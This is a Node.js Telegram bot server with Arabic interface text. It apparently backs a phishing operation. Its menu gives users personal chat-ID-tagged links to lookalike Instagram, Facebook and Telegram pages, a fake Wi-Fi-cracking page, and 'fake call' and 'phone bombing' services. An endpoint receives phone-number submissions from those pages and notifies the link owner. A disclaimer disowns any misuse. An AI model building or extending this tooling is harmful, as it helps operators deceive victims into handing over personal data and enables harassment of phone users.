const TelegramBot = require("node-telegram-bot-api");
const express = require("express");
const { Pool } = require("pg");

// ==============================
// الإعدادات الأساسية
// ==============================
const TOKEN = process.env.BOT_TOKEN;
if (!TOKEN) {
    console.error("❌ BOT_TOKEN is missing");
    process.exit(1);
}

const DATABASE_URL = process.env.DATABASE_URL;
if (!DATABASE_URL) {
    console.error("❌ DATABASE_URL is missing");
    process.exit(1);
}

const PORT = process.env.PORT || 3000;

// ==============================
// تشغيل السيرفر
// ==============================
const app = express();

app.use(express.json());

// ==============================
// الاتصال بقاعدة البيانات
// ==============================
const pool = new Pool({
    connectionString: DATABASE_URL,
    ssl: {
        rejectUnauthorized: false
    }
});

// ==============================
// إنشاء جدول الزيارات
// ==============================
async function initDatabase() {
    await pool.query(`
        CREATE TABLE IF NOT EXISTS visits (
            id BIGSERIAL PRIMARY KEY,
            chat_id TEXT NOT NULL,
            created_at TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP
        )
    `);

    console.log("✅ PostgreSQL Database Connected & Ready");
}

initDatabase().catch((error) => {
    console.error("❌ Database init error:", error);
    process.exit(1);
});

// ==============================
// إعداد بوت التليجرام
// ==============================
const bot = new TelegramBot(TOKEN, {
    polling: true
});

console.log("🤖 Telegram Bot is running...");

// ==============================
// المستخدمون الذين وافقوا
// ==============================
const acceptedUsers = new Set();

// ==============================
// القائمة الرئيسية
// ==============================
function sendMainMenu(chatId) {

    return bot.sendMessage(
        chatId,

        "👋 أهلاً بك في القائمة الرئيسية\n\nاختر المنصة التي تريدها من الأسفل:",

        {
            reply_markup: {
                inline_keyboard: [

                    [
                        {
                            text: "📸 Instagram",
                            callback_data: "instagram"
                        },
                        {
                            text: "📘 Facebook",
                            callback_data: "facebook"
                        }
                    ],

                    [
                        {
                            text: "✈️ Telegram",
                            callback_data: "telegram"
                        },
                        {
                            text: "📞 اتصال وهمي",
                            callback_data: "twitter"
                        }
                    ],

                    [
                        {
                            text: "💬 تفجير هواتف",
                            callback_data: "تفجير هواتف"
                        },
                        {
                            text: "📶 فك شبكات Wi-Fi",
                            callback_data: "whatsapp"
                        }
                    ],

                    [
                        {
                            text: "📊 إحصائيات البوت",
                            callback_data: "stats"
                        }
                    ]

                ]
            }
        }
    );
}

// ==============================
// أمر /start
// ==============================
bot.onText(/^\/start$/, async (msg) => {

    const chatId = msg.chat.id;

    const firstName =
        msg.from?.first_name || "غير معروف";

    const lastName =
        msg.from?.last_name || "";

    const username =
        msg.from?.username
            ? `@${msg.from.username}`
            : "لا يوجد";

    const fullName =
        `${firstName} ${lastName}`.trim();

    // إذا وافق مسبقاً
    if (acceptedUsers.has(chatId)) {
        return sendMainMenu(chatId);
    }

    // شروط الاستخدام
    await bot.sendMessage(
        chatId,

        `👋 أهلاً بك ${fullName}

🆔 معرف Telegram الخاص بك: ${chatId}
👤 Username: ${username}

📋 شروط استخدام البوت:
أنا غير مسؤول عن أي استخدام غير رسمي للبوت.
باستخدامك للبوت، أنت تقر بأنك قرأت الشروط وتوافق عليها.`,

        {
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "✅ أوافق على الشروط",
                            callback_data: "accept_terms"
                        }
                    ]
                ]
            }
        }
    );
});

// ==============================
// معالجة الأزرار
// ==============================
bot.on("callback_query", async (query) => {

    const chatId = query.message.chat.id;

    try {

        // ==========================
        // قبول الشروط
        // ==========================
        if (query.data === "accept_terms") {

            acceptedUsers.add(chatId);

            await bot.answerCallbackQuery(
                query.id,
                {
                    text: "تم قبول الشروط ✅"
                }
            );

            await bot.sendMessage(
                chatId,

                `✅ تم قبول الشروط.

أهلاً بك ${query.from.first_name || ""}.

🆔 ID الخاص بك:
${chatId}

اضغط /start للمتابعة.`
            );

            return;
        }

        // ==========================
        // التحقق من الموافقة
        // ==========================
        if (!acceptedUsers.has(chatId)) {

            await bot.answerCallbackQuery(
                query.id,
                {
                    text: "يجب الموافقة على الشروط أولاً."
                }
            );

            return;
        }

        // ==========================
        // الإحصائيات
        // ==========================
        if (query.data === "stats") {

            const usersResult =
                await pool.query(`
                    SELECT COUNT(DISTINCT chat_id)
                    FROM visits
                `);

            const visitsResult =
                await pool.query(`
                    SELECT COUNT(*)
                    FROM visits
                `);

            const totalUsers =
                parseInt(
                    usersResult.rows[0].count
                );

            const totalVisits =
                parseInt(
                    visitsResult.rows[0].count
                );

            await bot.answerCallbackQuery(
                query.id
            );

            await bot.sendMessage(
                chatId,

                `📊 **إحصائيات البوت الحالية:**

👥 المستخدمون:
${totalUsers}

🔗 الزيارات:
${totalVisits}

⏱️ آخر تحديث:
الآن`,

                {
                    parse_mode: "Markdown"
                }
            );

            return;
        }

        // ==========================
        // المواقع
        // ==========================
        const websites = {

            instagram:
                "https://instagram-two-henna.vercel.app/",

            facebook:
                "https://facebook-ruby-one.vercel.app/",

            telegram:
                "https://telegram-one-rho.vercel.app/",

            twitter:
                "https://callmyphone.org/",

            whatsapp:
                "https://wifi-free-gamma.vercel.app/",

            "تفجير هواتف":
                "https://kexart.com/"
        };

        const website =
            websites[query.data];

        if (!website) {

            await bot.answerCallbackQuery(
                query.id
            );

            return;
        }

        // ==========================
        // إنشاء الرابط باستخدام chatId
        // ==========================
        const separator =
            website.includes("?")
                ? "&"
                : "?";

        const referralUrl =
            `${website}${separator}chatId=${encodeURIComponent(chatId)}`;

        // ==========================
        // إرسال الرابط
        // ==========================
        await bot.sendMessage(
            chatId,

            `🔗 هذا رابطك الخاص:

${referralUrl}

🆔 Chat ID:
${chatId}

يمكنك مشاركة الرابط.`
        );

        await bot.answerCallbackQuery(
            query.id
        );

    } catch (error) {

        console.error(
            "❌ Callback error:",
            error
        );

        try {

            await bot.answerCallbackQuery(
                query.id,
                {
                    text: "حدث خطأ، حاول مرة أخرى."
                }
            );

        } catch (_) {}
    }
});

// ================================================================
// استقبال إرسال من الموقع
// ================================================================
app.post(
    "/api/submit-phone",
    async (req, res) => {

        try {

            const {
                phone,
                chatId
            } = req.body;

            // ==========================
            // التحقق من البيانات
            // ==========================
            if (!chatId) {

                return res.status(400).json({
                    success: false,
                    message: "Chat ID ناقص"
                });
            }

            if (!phone) {

                return res.status(400).json({
                    success: false,
                    message: "رقم الهاتف ناقص"
                });
            }

            // ==========================
            // حفظ العملية
            // ==========================
            await pool.query(
                `
                INSERT INTO visits (chat_id)
                VALUES ($1)
                `,
                [
                    String(chatId)
                ]
            );

            // ==========================
            // إشعار صاحب الرابط
            // ==========================
            await bot.sendMessage(
                String(chatId),

                `📩 يوجد إرسال جديد من موقعك.

🔗 Chat ID:
${chatId}

⏱️ الوقت:
${new Date().toLocaleString("ar-JO")}`
            );

            // ==========================
            // الرد للموقع
            // ==========================
            return res.json({

                success: true,

                message:
                    "تم تسجيل العملية بنجاح"
            });

        } catch (error) {

            console.error(
                "❌ Error in /api/submit-phone:",
                error
            );

            return res.status(500).json({

                success: false,

                message:
                    "خطأ داخلي في السيرفر"
            });
        }
    }
);

// ==============================
// فحص السيرفر
// ==============================
app.get("/", (req, res) => {

    res.send(
        "✅ Telegram Bot Server is running successfully!"
    );
});

// ==============================
// تشغيل السيرفر
// ==============================
app.listen(
    PORT,
    () => {

        console.log(
            `🌐 Web Server running on port ${PORT}`
        );

    }
);
